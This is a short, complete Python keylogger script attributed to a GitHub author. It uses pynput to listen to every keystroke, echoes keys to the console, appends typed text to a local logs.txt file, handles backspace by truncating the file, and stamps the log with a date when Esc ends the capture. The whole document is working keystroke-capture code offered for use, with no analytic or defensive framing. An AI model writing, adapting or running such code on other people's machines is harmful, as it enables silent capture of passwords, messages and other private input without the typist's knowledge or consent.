# Made by: kianrro
# https://github.com/kianrro

import datetime
from pynput.keyboard import Key, Listener

date = datetime.datetime.now()

def keyPressed(key):
    print(f"{key} pressed")
    with open("logs.txt", "a") as logsFile:
        try:
            char = key.char
            logsFile.write(char)
        except:
            if key == Key.space:
                logsFile.write(" ")
            elif key == Key.enter:
                logsFile.write("\n")
            elif key == Key.backspace:
                size = logsFile.tell()
                logsFile.truncate(size-1)
            elif key == Key.esc:
                pass
            else:
                logsFile.write(str(key) +  " ")

def loggerExit(key):
    if key == Key.esc:
        with open("logs.txt", "a") as logsFile:
            logsFile.write(f"\nLogged on: {date.strftime("%d %b %Y %H:%M")}\n\n")
        return False

with Listener(on_press = keyPressed, on_release = loggerExit) as logger:
    logger.join()
